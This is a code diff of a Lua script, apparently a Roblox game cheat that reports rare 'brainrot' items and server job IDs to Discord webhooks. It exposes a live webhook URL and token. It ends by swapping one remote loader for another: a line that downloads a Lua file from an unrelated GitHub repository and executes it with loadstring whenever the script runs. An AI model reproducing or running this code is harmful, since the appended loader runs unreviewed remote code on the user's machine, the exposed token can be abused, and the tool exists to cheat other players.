@@ -57,7 +57,7 @@ local WEBHOOKS = {
         sendTeleport = true
     },
     { -- Special brainrots + overpay
-        url = 'https://discord.com/api/webhooks/1449111713428275282/1CByDVDPiQUqD0r59w9DxtJ1F9CUpjbXzPrnA_kvtRvz2KIKpXMMBdTM2kYkYswTP45I',
+        url = 'https://discord.com/api/webhooks/1449406935161114635/ISt7MKlDflM9Ecih-dUB6XzCZWQnzOWN1DN0fXUJCZktfYxFfLXzw7fUWv_eA13-Kdhj',
         title = '⭐️ SPECIAL BRAINROTS',
         color = 0xff00ff,
         special = true,
@@ -117,7 +117,6 @@ local SPECIAL_BRAINROTS = {
     ['Reinito Sleighito'] = 0,
     ['Swaggy Bros'] = 0,
     ['Gingerbread Dragon'] = 0,
-    ['Los Spaghettis'] = 0,
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -215,8 +214,6 @@ local OBJECTS = {
     ['Gingerat Gerat'] = { emoji = '🥮', important = true },
     ['Reinito Sleighito'] = { emoji = '🦌', important = true },
     ['Gingerat Gerat'] = { emoji = '🍬', important = true },
-    ['25'] = { emoji = '⚜️', important = true },
-    ['Los 25'] = { emoji = '🗞', important = true },
     ['Swaggy Bros'] = { emoji = '🥤', important = true },
     ['Gingerbread Dragon'] = { emoji = '🥠', important = true },
 }
@@ -650,4 +647,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CapibaroLimonchel/FFISH/refs/heads/main/BotRuner2.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
